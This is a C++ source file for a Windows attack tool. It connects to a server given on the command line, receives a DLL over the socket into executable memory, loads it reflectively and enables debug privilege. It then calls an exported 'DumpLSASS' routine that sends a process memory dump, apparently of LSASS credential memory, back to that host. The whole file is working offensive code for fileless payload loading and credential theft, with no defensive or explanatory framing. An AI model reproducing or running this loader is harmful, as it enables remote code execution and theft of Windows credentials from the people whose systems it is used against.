#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <Windows.h>
#include <Dbghelp.h>
#include <iostream>
#include <winnt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <ktmw32.h>
#include <winsock2.h>
#include <string.h>>
#include "ReflectiveDLLInjection.h"

#pragma comment (lib, "Ws2_32.lib")

typedef int (*DumpLSASS)(SOCKET sock, char* proc_name);

int Send(SOCKET SendingSocket, LPVOID buffer, int size)
{
	int BytesSent;
	BytesSent = send(SendingSocket, (char*)buffer, size, 0);
	if (BytesSent == SOCKET_ERROR)
	{
		std::cout << "Client: send() error " << WSAGetLastError() << "\n";
		exit(0);
	}
	else
	{
		std::cout << "Client: send() is OK - bytes sent: " << BytesSent << "\n";
		// Some info on this sender side...
		// Allocate the required resources
		exit(0);
	}
}

int Recv(SOCKET SendingSocket, LPVOID buffer, int size)
{
	int BytesRecived;
	ZeroMemory(buffer, size);
	BytesRecived = recv(SendingSocket, (char*)buffer, size, 0);
	if (BytesRecived == SOCKET_ERROR)
	{
		std::cout << "Client: send() error " << WSAGetLastError() << "\n";
		exit(0);
	}

	std::cout << "Client: send() is OK - bytes recived: " << BytesRecived << " got " << (char*)buffer << "\n";
}

void validate_arguments(int argc, char **argv)
{
	// Validate the parameters
	if (argc != 4) {
		std::cout << "usage: " << argv[0] << "<server_address> <port> <process name> \n";
		exit(0);
	}
}

LPVOID AllocateMemoryToDLL(SIZE_T size)
{
	if (size)
	{
		LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!mem)
		{

			std::cout << "could not allocate error code " << GetLastError() << "\n";
			system("pause");
			exit(0);
		}
		memset(mem, '\xcc', size);
		return(mem);
	}
}

SOCKET CreateSocket(char * ip4, int port)
{
	WSADATA wsaData;
	SOCKET  SendingSocket;
	// Server/receiver address
	SOCKADDR_IN ServerAddr, ThisSenderInfo;
	// Server/receiver port to connect to
	int  RetCode;
	// Be careful with the array bound, provide some checking mechanism...
	int nlen;
	// Initialize Winsock version 2.2
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// Create a new socket to make a client connection.
	// AF_INET = 2, The Internet Protocol version 4 (IPv4) address family, TCP protocol
	SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (SendingSocket == INVALID_SOCKET)
	{
		std::cout << "Client: socket() failed! Error code: " << WSAGetLastError() << "\n";
		// Do the clean up
		WSACleanup();
		// Exit with error
		exit(0);
	}
	else
		std::cout << "Client: socket() is OK!\n";
	// Set up a SOCKADDR_IN structure that will be used to connect
	// to a listening server on port 5150. For demonstration
	// purposes, let's assume our server's IP address is 127.0.0.1 or localhost
	// IPv4
	ServerAddr.sin_family = AF_INET;
	// Port no.
	ServerAddr.sin_port = htons(port);
	// The IP address
	ServerAddr.sin_addr.s_addr = inet_addr(ip4);
	// Make a connection to the server with socket SendingSocket.
	RetCode = connect(SendingSocket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr));
	if (RetCode != 0)
	{
		std::cout << "Client: connect() failed! Error code: " << WSAGetLastError() << "\n";
		// Close the socket
		closesocket(SendingSocket);
		// Do the clean up
		WSACleanup();
		// Exit with error
		exit (0);
	}
	else
	{
		std::cout << "Client: connect() is OK, got connected...\n";
		std::cout << "Client: Ready for sending and/or receiving data...\n";
	}
	// At this point you can start sending or receiving data on
	// the socket SendingSocket.
	// Some info on the receiver side...
	return SendingSocket;
}

bool AdjustToken(HANDLE proc)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES priv = { 0 };
	if (OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

		CloseHandle(hToken);
		return TRUE;
	}
	else
		exit(0);
}

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}

//===============================================================================================//
DWORD GetReflectiveLoaderOffset(VOID * lpReflectiveDllBuffer)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;
#ifdef _WIN64
	DWORD dwCompiledArch = 2;
#else
	// This will catch Win32 and WinRT.
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currenlty we can only process a PE file which is the same type as the one this fuction has  
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
	{
		if (dwCompiledArch != 1)
			return 0;
	}
	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
	{
		if (dwCompiledArch != 2)
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while (dwCounter--)
	{
		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}

//===============================================================================================//
// Loads a DLL image from memory via its exported ReflectiveLoader function
HMODULE WINAPI LoadDLL(LPVOID mem)
{
	DWORD dwReflectiveLoaderOffset = 0;
	REFLECTIVELOADER pReflectiveLoader = NULL;
	DLLMAIN pDllMain = NULL;
	HMODULE hResult = NULL;

	// check if the library has a ReflectiveLoader...
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(mem);
	if (!dwReflectiveLoaderOffset)
		exit(0);

	pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)mem + dwReflectiveLoaderOffset);
	// call the librarys ReflectiveLoader...
	pDllMain = (DLLMAIN)pReflectiveLoader();
	if (pDllMain != NULL)
	{
		pDllMain(NULL, DLL_QUERY_HMODULE, &hResult);
	}
	
 	return hResult;
	
}

int main(int argc, char **argv)
{
	validate_arguments(argc, argv);

	char *ip = argv[1];
	int port = atoi(argv[2]);
	char* procName = argv[3];
	int size; 
	char DLLsize[50];
	HANDLE proc = GetCurrentProcess();
	LPVOID mem = 0;
	
	SOCKET sock = CreateSocket(ip, port);

	Recv(sock, DLLsize, 50);

	size = atoi(DLLsize);

	Sleep(2000);

	mem = AllocateMemoryToDLL(size);

	Recv(sock, mem, size);

	Sleep(2000);

	AdjustToken(proc);

	
	HMODULE Rlibary = LoadDLL(mem);
	//HMODULE libary = LoadLibraryA("C:\\Users\\Alik\\Desktop\\AutoProcDump\\reflective_dll.x64.dll");
	DumpLSASS dump = (DumpLSASS)GetProcAddressR(Rlibary, "DumpLSASS");
	//DumpLSASS dump = (DumpLSASS)GetProcAddressR(libary, "DumpLSASS");
	dump(sock, procName);
}